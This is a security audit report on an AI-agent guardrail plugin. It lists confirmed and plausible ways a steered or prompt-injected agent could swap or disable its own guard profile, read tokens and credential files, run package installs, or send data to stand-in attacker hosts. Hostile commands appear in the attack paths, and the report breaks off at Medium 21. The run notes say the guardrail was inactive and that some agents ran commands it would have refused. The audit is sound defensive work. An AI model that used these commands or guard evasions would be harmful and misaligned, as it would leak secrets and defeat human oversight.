# Security report — audit-2026-10-23
Verdict: FAIL — a confirmed High lets a guarded hunt start a QA run record for itself and swap its own guard profile (`hooks/lib/run-records.mjs:114`), a second confirmed High lets the hunt run package-manager entry scripts (`hooks/lib/qa-shell-writes.mjs:1163`), and the dependencies lane records one high runtime CVE (zod 4.1.8, GHSA-mrhx-c7xc-m3w5, in untracked `.opencode` local state).

| Ticket or audit | audit-2026-10-23 |
|---|---|
| Date (UTC) | 2026-10-29 14:20 |
| Scope | the whole tree (full audit) |
| Repositories | ultrapowers: dev at 386b837 (release candidate 2.3.0), 3046 files, 32 groups (31 folders and the root files) |
| Lanes run | dependencies, code (8 hunters), secrets-supply-chain, ai-surface, osint |

## Summary

One repository, full-tree audit, no ticket. 12 hunters, 1 research step and 34 verifiers ran, all on sonnet. Counts after verification and deduplication:

| Severity | Raised | Confirmed | Plausible | Rejected (to Discarded leads) | Unverified |
|---|---|---|---|---|---|
| High | 4 | 2 | 2 | 0 | 0 |
| Medium | 30 | 16 | 11 | 3 | 0 |
| Low | 21 | not verified by contract | | | 21 |
| CVEs | 1 advisory | high x1 (runtime, DoS-class) | | | |
| Advisories from research | 0 | current sources not checked: nothing to research | | | |

- **What decides the verdict.** FAIL on three independent grounds. (1) High 1, confirmed (9): the hunt profile lets a hunter run `run-records.mjs start --profile qa`; the QA record outranks the hunt record, so every later call is judged by the weaker QA profile. It is a different and wider path than the accepted residual (`end` after a Verdict line, `RELEASE-NOTES.md:47`). (2) High 2, confirmed (9): `python3 /usr/bin/pip3 install x` and `node .../npm-cli.js install x` pass every hunt rule. (3) One high CVE in a runtime dependency: `zod` 4.1.8 (GHSA-mrhx-c7xc-m3w5), which the tool reports for the production dependency `@opencode-ai/plugin` 1.15.13. Two more Highs stand as plausible, which the rule counts: the OpenCode V2 guard looks in the wrong directory (High 4), and a nested project root hides the run from the hook (High 3).
- **The CVE is weak as a ground and the owner should weigh it so.** It is a memory-exhaustion (denial-of-service class) advisory; nothing tracked imports `zod` or `@opencode-ai/plugin` (`.opencode/plugins/ultrapowers.js:15` uses node built-ins only); and `.opencode/package.json` and `package-lock.json` are untracked and git-ignored (`.opencode/.gitignore:2-3`), so they are local OpenCode state, not shipped content. The severity is the tool's and is not lowered for reachability. The earlier audit's three `toml` advisories are gone: today's report lists only `zod` and `@opencode-ai/plugin`.
- **The substance is the guardrail, again.** All four Highs and 23 of the 27 surviving Mediums sit in the PreToolUse guardrail (`hooks/qa-guardrail`, `hooks/lib/qa-shell-writes.mjs`, `hooks/lib/run-records.mjs`), its harness adapters and registrations (OpenCode, Hermes, Cursor, Codex, Gemini) or the autopilot engine; the other four are the research step's input, the ticket body filter, task-review's symlink handling and the scaffolded settings. All the earlier audit's findings are closed or changed (see the next section); the new findings are mostly the next layer of the same class: shapes a profile is meant to refuse that still pass, and the new run-record store itself.
- **Verification.** 34 verifiers, one per High or Medium finding, ran on sonnet at the human partner's request (the contract says the most capable model). 18 returned confirmed, 13 plausible, 3 rejected (the repository's own local `.claude/settings.json`, the team-memory write path, the Chrome DevTools telemetry default). No verifier failed; none was sent back. The verifiers could not reach the network, so every step that lives in a third-party harness (Cursor, Codex, Gemini, OpenCode V2, Hermes, Claude Code's hook cwd) stayed unseen and those findings are plausible, not confirmed.
- **Deduplication.** The MCP allow-list gap was raised by the code lane (OpenCode names) and the ai-surface lane (all non-Claude spellings): one finding, Medium 19. The team-memory write path was raised again (code hunter 1, ai-surface in part): rejected once, and only its narrower remainder (unprotected auto-loaded agent code) stands as Medium 23. The ai-surface lane's status is `incomplete` because the hunter read only part of the analyzer; it still produced a block.
- **Run notes (for the owner).**
  1. Verifiers and hunters ran on sonnet, the research step too, at the human partner's request.
  2. The guardrail was not active in this session (see below). The contract's rules held by prompt only, and several hunters and verifiers did what the hook would have refused: code hunter 8 ran `npm view` for six public package names and a `git diff --stat` between a Windows system file and `LICENSE` to test a finding (no credential read; the contract says an exploit is described, never run); code hunters 3 and 4 read the Hermes and OpenCode sources through `gh api` GET; the verifier of Medium 23 ran a Python heredoc probe that wandered into a background REPL, which it stopped (it wrote nothing). No credential was read, no file outside `reviews/audit-2026-10-23/` was written, nothing was installed.
  3. Several hunter and verifier outputs were flagged by the harness as instruction-shaped (settings-json, bypass-permissions): each was a quotation of a permission list or adapter flag inside a finding. No instruction in any subagent output was followed.
  4. `security-findings.json` holds the hunters' blocks abridged by the gatekeeper (flagged `abridged`), because the transcripts could not be re-read when it was written; every verifier received the unabridged finding objects.
  5. `reviews/audit-2026-10-23-pre-fix/` and this folder are untracked. The OSINT lane notes that `reviews/audit-2026-10-11/` (file:line and exploit shapes) is tracked and public; commit these two folders only after the fixes land.

Guardrail: not active on this harness. A probe `ls S:/ultrapowers/.agents/mcp-secrets.env`, a path the hunt profile refuses by name, ran and failed only because the file does not exist; no `HUNT-GUARDRAIL DENY` reached this session or any hunter or verifier. The caller states the installed plugin is 2.2.0, which predates run records and reads the old `hunt-active` file; I did not confirm that this is the cause. The run record was started and read back (`hunt-audit-2026-10-23-b2cdcb2e`, session bound), and it will be ended with `run-records.mjs end`.
Research: Current sources not checked: every declared subject is covered by an audit tool or not declared (`DECLARED` held two npm dependencies, both covered by `npm audit`; no runtime or image rows). Research tools found: `gh` GET on the global advisory database, Firecrawl, WebSearch and WebFetch, context7, deepwiki; the `langfuse` server failed to connect and was not needed.

## Earlier findings (audit of 993f2d4)

The earlier hunt (`reviews/audit-2026-10-23-pre-fix/`, head 993f2d4) is not counted in this report's findings. Each line is re-verified on head 386b837 by reading the code, with the intent taken from `RELEASE-NOTES.md` v2.3.0. The earlier report's body numbers 12 Mediums (10 confirmed, 2 plausible); its summary table says 15 raised (11 confirmed, 2 plausible, 2 rejected) and its findings file lists 13 plus the rejected ones. Below: the High, the 12 numbered Mediums, the finding only the JSON file carried, and the 2 rejected leads (15 Mediums in all).

High 1 — interpreter or shell given its code through `/dev/stdin` and a heredoc: `closed`. `stdinScript` refuses a device or process-file script operand (`hooks/lib/qa-shell-writes.mjs:476`; python `:497,499`, node `:519,521`, deno `:534`, perl and ruby `:544,546`, eval-flag programs `:560`, the hunt's own check `:1161`, a shell's script operand `:1959`). A different route to run code nobody read is open in the hunt: this audit's High 2 (`:1163`).
Medium 1 — `find -delete` behind a raw-text rule: `closed`. The analyzer denies `-delete` on the words as the shell runs them (`qa-shell-writes.mjs:2259-2261`, `DESTRUCTIVE_WHY` `:1178`; `rm`, `rmdir`, `shred`, `dd`, `mkfs` `:2487-2491`); the text rule stays as a second layer (`hooks/qa-guardrail:1032`).
Medium 2 — key-file and `/proc/*/environ` rules are text regexes: `changed`. `//`, `/./`, `..` and symlinks are canonicalised (`qa-guardrail:1068-1071`; `qa-shell-writes.mjs:1328-1350`; `hooks/lib/guard-paths.mjs:54-67`) and every typed `/proc/.../environ` is refused (`qa-shell-writes.mjs:264`; `qa-guardrail:1077`). Glob and expansion spellings still pass: this audit's Medium 2 and Medium 3.
Medium 3 — credential variables printed (`${GH_TOKEN:-}`, `declare -p`, `awk ENVIRON`): `closed` for the three named forms. `${NAME<op>}` counts as a read of `NAME` (`qa-shell-writes.mjs:134-143`); `declare -p` and name references are refused (`:1512-1531`); `awk ENVIRON` is refused (`:2207-2208`). Neighbours are open: Medium 4 (jq, yq), Medium 5 (`gh auth status -th`) and a Low (two-step name reference).
Medium 4 — autopilot git `rm`, `mv`, `--output` skip the protected paths: `closed`. Their operands go through `checkTarget` (`qa-shell-writes.mjs:2087-2115`), so do `git checkout <tree> <path>` (`:2130-2147`) and the folder of `git worktree add` (`:2154-2161`).
Medium 5 — an agent switches its own guard off with one allowed call: `changed`. A call can no longer remove or rewrite a run record (`MARKER_RE`, `qa-shell-writes.mjs:1182,1289`; `qa-guardrail:642`), and `end` needs a report with a Verdict line (`hooks/lib/run-records.mjs:136-157`; the accepted residual is `RELEASE-NOTES.md:47`). The guard can still be swapped or switched off in other ways: High 1 (start a QA record), High 3 (nested root), Medium 6 (`git stash push --all` removes the marker).
Medium 6 — unattended stages inherit the full environment: `changed`. The environment is an allow-list (`skills/autopilot/scripts/autopilot-lib.mjs:480-552`; `autopilot.mjs:1495-1508`); `ODOO_API_KEY` and the secrets-file keys reach a stage only when its MCP snapshot names them (`autopilot-lib.mjs:519`). The engine's tracker tokens are still shared when no stage credentials are set (`autopilot-lib.mjs:492-495`), and a script a stage runs is the residual accepted by decision (`RELEASE-NOTES.md:47`).
Medium 7 — approval binding and PR targets trusted from `autopilot.json`: `closed`. An approval must match the latest packet the engine itself posted on the tracker (`autopilot.mjs:480-552`) and a PR URL is the one the forge returns for the ticket's branch (`:1017-1024`). A related gap is Medium 13 (the config snapshot's scope).
Medium 8 — autopilot curl with an indirected `$VAR` when `qa.hosts.allowed` is empty: `changed`. Direct `curl` and `wget` with an empty list are denied (`qa-shell-writes.mjs:2532,2551`) and the stage environment is an allow-list; the control is bypassed through a launcher the analyzer does not unwrap: Medium 10.
Medium 9 — the ready label authenticates the labeller, not the ticket body: `changed`. A body edited after the label is refused (`autopilot.mjs:351-455`) and hidden HTML comments are stripped (`skills/new-task/scripts/fetch-ticket.mjs:326-369`); other invisible forms reach the stage: Medium 12.
Medium 10 — Windows: bare tool names resolve in the checked-out repository first: `closed`. `hooks/lib/resolve-tool.mjs:28-58` resolves from absolute PATH entries outside the project, and every start goes through it (`repos.mjs:43,73,104`; `tracker.mjs:41`; `fetch-ticket.mjs:78`; `hunt-preflight.mjs:335`). Two Lows remain: the scaffolded MCP launcher (`skills/init/scripts/init.mjs:99`) and the Hermes node lookup (`.hermes-plugin/__init__.py:293`).
Medium 11 — MCP write-deny is a name list, isolation is claude-code only, Antigravity calls lose their tool name: `changed`. Antigravity keeps its server and tool name and an unreadable name is refused (`hooks/lib/guardrail-cli.mjs:15-25`; `qa-guardrail:675-677`); the snapshot rule holds for `mcp__<server>__<tool>` names (`:681-685`). Isolation is still Claude Code only (`autopilot.mjs:1539`): Medium 19.
Medium 12 — the scaffold pre-approves `git blame`, whose `-S` and `--ignore-revs-file` read any file: `closed`. `git blame` is gone from the allow list (`templates/.claude/settings.json.tmpl:9-15`) and denied (`:92-94`). A neighbour read primitive is Medium 16 (`git diff` of an outside path).
Finding only in the earlier JSON — guardrail credential-variable exemptions come from the audited repository's `.agents/ultrapowers.json`: `closed`. The hunt reads no role variable and a role variable never stands for a tracker credential (`qa-shell-writes.mjs:1196-1199`).
Rejected lead — the scaffold pre-approves build and test commands: `unchanged`, still rejected. The scaffold now pre-approves only the toolchains found at the project root (`init.mjs:831-869`, as the verifier of the local-settings lead read it).
Rejected lead — an autopilot stage may write the team-memory store: `changed`. Raised again this audit and rejected again (Discarded leads; recorded decision `12e150f`, `RELEASE-NOTES.md:238`); only its narrower remainder (unprotected auto-loaded agent code) stands, as Medium 23.

## Repositories

### ultrapowers

### CVEs

| Package | Version | Advisory | Severity | Fixed in | Runtime |
|---|---|---|---|---|---|
| zod | 4.1.8 | GHSA-mrhx-c7xc-m3w5 | high | 4.6.6 | runtime (production dependency of `.opencode/package.json` through `@opencode-ai/plugin` 1.15.13; untracked, git-ignored local state; memory-exhaustion class; not imported by repository code) |

`@opencode-ai/plugin` 1.15.13 is reported high only through `zod`: one advisory. The tool's suggested fix (`@opencode-ai/plugin` 0.9.11) is a major downgrade, not usable; the real fix is `zod` 4.6.6 or newer, by an `overrides` entry next to the existing `toml` 5.0.1 one or a plugin release that depends on it. `tests/brainstorm-server` is clean (`ws` 8.22.0, exit 0). The root `package.json` declares no dependencies and has no lockfile (`npm audit` exit 1, `ENOLOCK`): a Low. Dependabot cannot see `.opencode` (git-ignored), so its empty alert list says nothing about this advisory.

### Advisories from research

Current sources not checked: every declared subject is covered by an audit tool or not declared; nothing to research.

Not researched: runtime (not declared in a readable form), base image (not declared in a readable form), `@opencode-ai/plugin` 1.15.13 (covered by npm audit), `ws` ^8.22.0 (covered by npm audit).

### Findings

#### High

1. **A guarded hunt can start a QA run record for itself and swap its own guard profile** `hooks/lib/run-records.mjs:114` — authorization bypass (guard downgrade), confidence 9, verification **confirmed** (9)
   - Attack path: hunter Bash call `node <plugin>/hooks/lib/run-records.mjs start --root . --profile qa --id x` -> the hunt allows it (`qa-shell-writes.mjs:1077,1150-1171`; the refusal at `:1720-1729` is autopilot-only) -> `startRun` refuses only a live record of the same profile and id (`run-records.mjs:124-129`) -> `pickRun` returns the QA record before the hunt record (`:169`) -> every later call is judged by the QA profile, which has no program allow-list (`qa-shell-writes.mjs:1762`), no URL-tool refusal (`qa-guardrail:704`) and no gh/glab write refusal (`:966-980`).
   - Exploit: a prompt-injected hunter writes `reviews/x/p.js` with the Write tool and runs it, or curls any host while `qa.hosts.allowed` is empty. Described, never run.
   - Mitigation examined: `MARKER_RE` protects the runs folder from direct writes only; the accepted residual covers `end` after a Verdict line, not `start`, and nothing logs a start; no test asserts a hunt or QA session cannot start a record.
   - Fix: refuse any word resolving to `run-records.mjs` in the hunt and QA profiles except `end --run <own run>`; make `startRun` refuse while a live record already applies to the caller's session; let the stricter record win in `pickRun`.

2. **The hunt runs any regular node or python file outside the project, including npm, npx and pip entry scripts** `hooks/lib/qa-shell-writes.mjs:1163` — command execution and install in a read-only profile, confidence 9, verification **confirmed** (9)
   - Attack path: `python3 /usr/bin/pip3 install x` or `node /usr/lib/node_modules/npm/bin/npm-cli.js install x` -> `huntCheck` returns null for a script run (`:687,874`) so the package-manager refusals never see it -> `huntProgramWhy` returns '' for any outside regular file, reading no argument (`:1163-1165`) -> `afterGate` has no rule -> hook exits 0. The same route runs a nested harness session.
   - Exploit: installs and runs package install scripts, or starts an unguarded session, from a hunt that must install nothing and reach no network. Described, never run.
   - Mitigation examined: scripts inside the project and `/dev/stdin` are refused; the outside-script allowance (commit 41ab31d, v2.3.0 notes) was recorded for the plugin's own scripts, not package managers; the same rules refuse every other spelling of an install.
   - Fix: allow a node or python script outside the project only when it matches `HUNT_OWN_SCRIPTS_RE`.

3. **Entering a folder that holds `.agents/ultrapowers.json` (worktree, nested project) makes the run's guard inert** `hooks/qa-guardrail:138` — fail-open guard, confidence 7, verification **plausible** (7)
   - Attack path: a QA agent calls `EnterWorktree` (allowed through `read_only_re`, `:754`), or a hunter dispatches an Agent with `isolation: worktree` or `cd`s into `.claude/worktrees/*` -> `find_root_r` stops at the nested project (`:138,150`), a session-bound record is never consulted -> `exit 0` at `:280`.
   - Exploit: after the first call, writes, network and key reads run unguarded in the nested folder. Not run.
   - Mitigation examined: nested roots are a stated design (`RELEASE-NOTES.md` v2.3.0, `tests/hooks/test-run-records.mjs:157`) but its reason applies to session-less records, not to a record bound to this session; the bridge cannot be hidden this way. Unseen: whether Claude Code runs the hook with its cwd inside the worktree.
   - Fix: apply a session-bound record from any ancestor; refuse `EnterWorktree` and `isolation: worktree` during a run.

4. **The OpenCode V2 run guardrail looks for the run record in the wrong directory (`ctx.directory` does not exist in V2)** `.opencode/plugins/ultrapowers.js:538` — fail-open guard, confidence 7, verification **plausible** (7)
   - Attack path: V2 `execute.before` (`:645`) -> `guardV2Tool` (`:81-90`, ignores `sessionID`) -> `guardTool(projectDir)` with the shared service's `process.cwd()` (`:538-541`) -> `runGuardrail` (`guardrail-bridge.mjs:213-222`) finds no run -> `{ deny: false }`, `hooks/qa-guardrail` never spawned.
   - Exploit: a QA run, hunt or autopilot stage in a project other than the service's cwd runs unguarded (the autopilot adapter runs `opencode run --dangerously-skip-permissions`, `harnesses.mjs:61-67`). Not run.
   - Mitigation examined: the plugin's own comment hedges ("when it does", `:539-540`), the release notes list the V2 guard as not yet run live (`RELEASE-NOTES.md:274`), and the repository's plan concedes a long-lived V2 service has no trustworthy `process.cwd()`; the watcher checks only the harness name (`harnesses.mjs:114`).
   - Fix: use `ctx.location.directory` and the session's directory per call; deny when a run exists under any candidate; add a liveness probe to the watcher.

#### Medium

1. **`host_of_r` reads a backslash or `#` before `@` as userinfo, so a URL for one host is judged as another** `hooks/qa-guardrail:862` — SSRF / egress bypass, confidence 8, verification **confirmed** (8)
   - Attack path: a fetch or browser tool with `http://127.0.0.1:8080\@example.com/` -> `host_of_r` returns `example.com` (`:860-867`) -> the forbidden, allowed and `non_public_host` tests pass (`:915-933`) -> a WHATWG consumer reaches 127.0.0.1.
   - Exploit: reaches loopback or metadata hosts in the research stages, a forbidden host, or leaves a QA or autopilot host list with data in the query. Not run.
   - Mitigation examined: curl and wget operands refuse these spellings (`qa-shell-writes.mjs:1057-1058`); URL tools do not; no fixture or spec records it as accepted; the hunt refuses URL tools.
   - Fix: refuse a backslash, whitespace, `@` or `#` before the first `/`; parse with a WHATWG `URL`.

2. **The `/proc/.../environ` refusal is bypassed by a glob in the last segment or by `find -name environ`** `hooks/lib/qa-shell-writes.mjs:1324` — secret disclosure, confidence 9, verification **confirmed** (8)
   - Attack path: `cat /proc/self/envir?n` -> `ENVIRON_RE` (`:264`) and `qa-guardrail:1077` need the literal word; the glob branch tests key-file names only (`:1336`, `guard-paths.mjs:121`) -> allowed in the hunt, QA and autopilot.
   - Exploit: prints the inherited environment, tokens included. Not run.
   - Mitigation examined: typed, `//`, `/./` and split-quote spellings are refused; the find and recursive-grep variants are nearer the documented pattern-guard limit; `/proc/<pid>/environ` under Git Bash on Windows not verified.
   - Fix: deny glob words under `/proc` and `/proc` operands in the hunt.

3. **Key-material rule misses `${X:-.env}`, brace lists across a slash and program-side globs** `hooks/lib/qa-shell-writes.mjs:1316` — secret disclosure, confidence 9, verification **confirmed** (8)
   - Attack path: `cat ${X:-.env}` -> the tokenizer makes one dynamic part (`:128-144`), `checkAlias` tests only the empty literal (`:1320-1326`), `qa-guardrail:1072` needs another character before `.env` -> prints `.env`. `cat {/dev/null,.env}` and `find . -name '?env' -exec cat {} +` also pass.
   - Exploit: reads `.env`, `.npmrc`, `.netrc` during a read-only run. Not run.
   - Mitigation examined: same-segment braces, `//`, `/./`, `..`, 8.3 names are handled; plain `$'.env'` is caught; `git add -f` is refused outside autopilot.
   - Fix: refuse an unresolved expansion as a reader's operand; expand braces; match key names with the program's glob rules.

4. **jq and yq environment-read refusals are bypassed (`[env]`, `{a:env}`, bare `envsubst`)** `hooks/lib/qa-shell-writes.mjs:1141` — secret disclosure, confidence 8, verification **confirmed** (9)
   - Attack path: `jq -n '[env]'` -> the regexes at `:1141` and `:2215` need `env` after start, space, `|`, `(`, `;`, `,` -> no other rule -> allowed (jq and yq are on the hunt list).
   - Exploit: prints every environment variable. Not run.
   - Mitigation examined: `$ENV`, `env`, `env(` are refused; no fixture covers jq or yq environment reads; `RELEASE-NOTES.md:22` claims they are refused.
   - Fix: refuse `env` and `envsubst` anywhere in a jq or yq program.

5. **`gh`/`glab auth status -th` or `-ta` prints the token; the refusal matches only `-t\b`** `hooks/qa-guardrail:978` — secret disclosure, confidence 8, verification **confirmed** (9)
   - Attack path: `gh auth status -th github.com` -> no text-rule match -> the analyzer checks the verb `status` only (`qa-shell-writes.mjs:2338-2342`) -> gh prints the unmasked token. Quote-split `--show-tok""en` passes too.
   - Exploit: the hunt, an autopilot stage and the session door read the forge token the code says is never read out. Not run.
   - Mitigation examined: `gh auth token`, `-t` and `--show-token` alone are refused; the QA profile has no gh/glab rule at all.
   - Fix: judge `auth status` flags in the analyzer.

6. **`git stash push --all` removes the ignored autopilot marker in the session door** `hooks/lib/qa-shell-writes.mjs:2150` — guard switch-off, confidence 7, verification **confirmed** (8)
   - Attack path: `git stash push --all` (allowed with any flags, `:2150-2151`) -> the gitignored `.ultrapowers/autopilot-active` leaves the tree -> without `ULTRAPOWERS_AUTOPILOT_INSIDE` the hook exits 0 (`qa-guardrail:280`) -> `git stash pop` restores it before `runEnd`'s check (`autopilot.mjs:1415`).
   - Exploit: a steered stage runs push-capable commands unguarded. Not reached in the watcher door or in QA and hunt.
   - Mitigation examined: `rm`, `mv`, `find -delete` on the marker are refused; the pinned fixture allows `git stash push -u`.
   - Fix: refuse stash flags and pathspecs while the marker exists.

7. **`yq -i` is not judged as a write in QA or autopilot, and the hunt's yq check misses `-ie` and `-s.a`** `hooks/lib/qa-shell-writes.mjs:1139` — write confinement bypass, confidence 7, verification **confirmed** (8)
   - Attack path: `yq -i '<expr>' .github/workflows/ci.yml` in autopilot reaches no `checkTarget`; in the hunt `/^-[A-Za-z]*[is]$/` misses `-ie`, `-iP`, `-i=true`, `-s.a`.
   - Exploit: rewrites protected CI or settings files, or the run record in a hunt. Not run.
   - Mitigation examined: the QA and autopilot deny-lists are documented as not a sandbox; the hunt is meant to be a closed allow-list.
   - Fix: treat yq `-i`, `--inplace`, `-s` as a write in every profile.

8. **`gh`/`glab` read verbs that write files, and `gh api` to any host, escape the autopilot rules** `hooks/lib/qa-shell-writes.mjs:2300` — protected-path and egress bypass, confidence 7, verification **confirmed** (8)
   - Attack path: `gh run download` or `gh repo clone o/r .github/x` -> the gh branch never calls `checkTarget` (`:2293-2342`) -> attacker content lands in a protected path; `gh api https://evil/...`, `--hostname`, `GH_HOST=` pass because the refusals are hunt-only (`:2305,2321`).
   - Exploit: drops CI or hook files, sends typed data to an unlisted host. Not run.
   - Mitigation examined: tracker writes and non-GET api are refused; a headless stage holds a read-only token; the engine token lacks `workflow` and a human reviews the PR (deployment facts, not enforced by code).
   - Fix: refuse `download` and `clone` in autopilot; apply the hunt's `--hostname` and `://` refusals.

9. **`sort --compress-program` is not refused in the hunt and runs a program on file contents** `hooks/lib/qa-shell-writes.mjs:2417` — command execution from a listed program, confidence 6, verification **plausible** (6)
   - Attack path: `sort -S 1k --compress-program=sh reviews/<id>/p.txt` -> `sort` is on the hunt list, its only rule is `-o`/`--output` (`:1136-1144,2417-2431`).
   - Exploit: arbitrary commands from the hunt. Not run; GNU sort's buffer threshold and the MSYS build are unseen.
   - Mitigation examined: `rg --pre`, `git grep -O`, `--ext-diff` are refused as the same class.
   - Fix: refuse `--compress-program` and `-T` for `sort`.

10. **Autopilot curl/wget egress allow-list with an empty list is bypassed by any launcher outside the analyzer's wrapper list, including the plugin's own `task-done`** `hooks/lib/qa-shell-writes.mjs:1581` — tool misuse, confidence 8, verification **confirmed** (7)
    - Attack path: `task-done ... curl 'https://attacker/c?d=<data>'` -> the analyzer sees program `task-done` (`:1581-1697`), `egressWhy` never runs (`:2531-2552`), the shell-side host check is skipped for an empty list (`qa-guardrail:1146`) -> `task-done:40` executes curl.
    - Exploit: a steered execute or qa stage sends data it read. Not run.
    - Mitigation examined: the literal `bash ... -s` form is incidentally denied (`:1957`); the capability is a subset of the documented script-file residual; README:402 states the allow-list without that qualification.
    - Fix: judge the whole command text when the list is empty; add the launchers to the unwrapped set; ship OS or proxy egress guidance.

11. **STEP 0b hands attacker-controlled manifest strings, unfiltered, to a full-tool research subagent that runs before any guardrail** `agents/vulnerability-hunter.md:113` — untrusted text steering an unguarded agent, confidence 7, verification **confirmed** (7)
    - Attack path: a hostile branch adds a dependency string carrying instructions -> `push()` (`hunt-preflight.mjs:146-148`) keeps it, the package.json loop copies it (`:193-200`), `render()` prints it raw and a newline forges rows (`:629`) -> the research subagent, dispatched before the run record starts, acts with the session's tools.
    - Exploit: a compliant model leaks session data or writes files. Described, never run.
    - Mitigation examined: only the prompt sentence that rows are data; no grammar, length cap or tool allow-list.
    - Fix: validate subjects and versions, reject control characters, render rows as JSON, restrict the research step's tools.

12. **Ticket body hidden-text control strips only HTML comments; other invisible channels reach the unattended stage** `skills/new-task/scripts/fetch-ticket.mjs:326` — prompt injection, confidence 7, verification **confirmed** (7)
    - Attack path: an issue with a link reference definition, a bogus comment or an Odoo `d-none` span -> a maintainer labels the rendered text -> the stage reads the raw body (`fetch-ticket.mjs:326-369`, `odoo.mjs:120-131`) -> the research stages fetch any public host with an unchecked query.
    - Exploit: invisible instructions steer a fetch or the plan. Not run.
    - Mitigation examined: edit-time or raw-hash binding only (`autopilot.mjs:387-447`); the weaker forms (tag characters, alt text) depend on the model.
    - Fix: normalise what the stage reads; show the approver the sanitized text or its digest.

13. **Config snapshot covers only `tickets` and `autopilot`; `repos`, `topology` and `qa` are read live** `skills/autopilot/scripts/autopilot.mjs:91` — tool misuse, confidence 6, verification **confirmed** (7)
    - Attack path: a script a stage runs rewrites `.agents/ultrapowers.json` -> `repoDirs` (`repos.mjs:373-377`, no containment) repoints the engine's push and PR; deleting `qa` makes `nextStage` route to `pr` with no QA verdict (`autopilot-lib.mjs:697`, `autopilot.mjs:960-961`).
    - Exploit: a pull request opened with the engine's token on a clone the stage chose; QA silently dropped. Not run.
    - Mitigation examined: the prerequisite is the documented script residual; the earlier audit rated the unsnapshotted config Low; the docs (`autopilot-watcher.md:58`) overstate the snapshot.
    - Fix: snapshot and compare every key the engine or guardrail reads; contain `repos[].path`.

14. **task-review reads and posts the `reviews/<ID>` report files through symlinks, and writes `TASK-REVIEW.md` through them** `skills/task-review/scripts/post-review.mjs:302` — symlink following, confidence 7, verification **confirmed** (8)
    - Attack path: a branch commits `reviews/<ID>/QA-REPORT.md` as a symlink to `../../.agents/mcp-secrets.env` -> `task-review --post` -> `reviewFolderProblem` checks folders only (`autopilot-lib.mjs:22-42`) -> `readFileSync` follows the link (`post-review.mjs:302-317,397-401`) -> the secrets text is posted on the ticket and PR.
    - Exploit: the branch author reads the maintainer's secrets file. Write side: `assemble-review.mjs:582-584`. Never run.
    - Mitigation examined: only `assertReportPath` and `artifactPath` check files; a Windows checkout with `core.symlinks=false` materialises the link as text.
    - Fix: `lstat` each report file and refuse links; check the write target.

15. **`autopilot status` skips the git-config change guard but still runs `git status` and `git checkout`, which start filter drivers** `skills/autopilot/scripts/autopilot.mjs:283` — git configuration trust, confidence 6, verification **confirmed** (6)
    - Attack path: a stage script plants a filter driver -> a human runs `status` -> `gitConfigChange` is null (`:283`) and `ensureOnTicketBranch` runs (`:290`, `repos.mjs:242-251`) -> `git status` runs the clean filter in the engine's full environment; `gitArgs` pins no `filter.*`.
    - Exploit: code runs with the engine's tokens. Never run.
    - Mitigation examined: the foothold is the declared script residual; the same planted config fires on the user's own git; the verifier rated it low to medium.
    - Fix: run the comparison for `status` too and make it read-only.

16. **Scaffolded Claude settings pre-approve `git diff` but their read-any-file denies miss git's flagless outside-path form** `templates/.claude/settings.json.tmpl:11` — permission allow-list bypass, confidence 8, verification **confirmed** (7)
    - Attack path: `git diff ~/.aws/credentials README.md` -> `Bash(git diff:*)` allows it, none of the denies at `:87-95` matches, `Read` denies do not govern Bash, the guardrail is inert outside a run (`qa-guardrail:280`) -> git prints the file. Also `git show HEAD:web/.env`.
    - Exploit: an injected interactive session prints a credential file. Only `--stat` on a non-secret system file was run to confirm git's behaviour.
    - Mitigation examined: inside a run `KEY_RE` stops the named credential word; unseen: any Claude Code prompt for out-of-tree git operands.
    - Fix: stop pre-approving `git diff:*` as a prefix; deny out-of-tree operands; add an OS-level read deny.

17. **Hermes adapter judges relative paths against the process cwd while Hermes runs them in the session's persisted `cd` directory** `.hermes-plugin/__init__.py:351` — authorization bypass, confidence 7, verification **confirmed** (8)
    - Attack path: `terminal cd .agents` (a bare `cd` is allowed, `qa-shell-writes.mjs:1807-1814`), then `write_file ultrapowers.json` -> the guard resolves it at the root (`qa-guardrail:564-571,815-836`), the anchored patterns do not match -> Hermes writes `.agents/ultrapowers.json`.
    - Exploit: rewrites config, CI, hook files or the state file in an autopilot stage; after `cd ~` any file outside the workspace. Never run.
    - Mitigation examined: the per-call `workdir` is bounded, the persisted `cd` is not read; the Hermes source it relies on is outside the repository (installed copy, version unknown).
    - Fix: send the live session cwd, or pin an absolute `workdir`.

18. **Hermes adapter passes `~` paths and `workdir: ~` to a guard that reads them as project-relative** `.hermes-plugin/__init__.py:323` — authorization bypass, confidence 8, verification **plausible** (7)
    - Attack path: `write_file {path:'~/.bashrc'}` -> the guard judges `<root>/~/.bashrc` (`guard-paths.mjs:54-67`), no `~` check in the file-tool branch (`qa-guardrail:833-837`) -> Hermes expands `~`.
    - Exploit: writes a startup file in the user's home from an autopilot stage. Never run.
    - Mitigation examined: unseen: that Hermes' `write_file` expands `~` (the repository shows only `read_file`); the `workdir: ~` variant is incidentally denied in the ordinary install.
    - Fix: expand `~` in the adapter and deny any argument still starting with `~`.

19. **The autopilot stage's MCP allow-list only judges names shaped `mcp__<server>__<tool>`, so OpenCode's, Hermes' and Cursor's MCP tools bypass it** `.opencode/plugins/ultrapowers.js:71` and `hooks/qa-guardrail:681` — authorization bypass, confidence 8, verification **plausible** (7) (code and ai-surface lanes, one finding)
    - Attack path: a steered OpenCode stage calls `postgres_query` from a server outside the snapshot -> the snapshot check needs `mcp__?*__?*`, the autopilot profile has no default-deny -> allowed; only Claude Code gets `--strict-mcp-config` (`autopilot.mjs:1539`).
    - Exploit: reads or changes data in a connector the project never listed. Not run.
    - Mitigation examined: tracker, mail and git name rules still fire; README and the watcher doc say isolation is Claude Code only but the v2.3.0 note claims it unqualified; Pi overstated (no MCP in its watcher stage).
    - Fix: apply the server allow-list to every harness spelling; isolate OpenCode's config per stage.

20. **The QA agent inherits every tool of the session and the QA profile does not restrict MCP servers that are not named like a tracker** `agents/qa-specialist.md:4` — excessive agent privilege, confidence 6, verification **plausible** (7)
    - Attack path: text rendered by the app under test steers the QA agent to a non-tracker MCP write -> the QA profile judges only tracker-named tools (`qa-guardrail:661`), `:915` and `:936` allow it.
    - Exploit: destructive writes or outbound connectors; a plain write sinks into the user's own account, not an outsider's. Not run.
    - Mitigation examined: the harness permission prompt; the hunt and autopilot profiles close this, the QA profile does not.
    - Fix: add a tools allow-list and a QA-profile MCP rule.

21. **Agent-written markdown is posted unsanitized by the engine and task-review; a remote image is an egress channel the host guardrail cannot see** `skills/autopilot/scripts/autopilot.mjs:797` — sensitive data exposure, confidence 7, verification **plausible** (7)
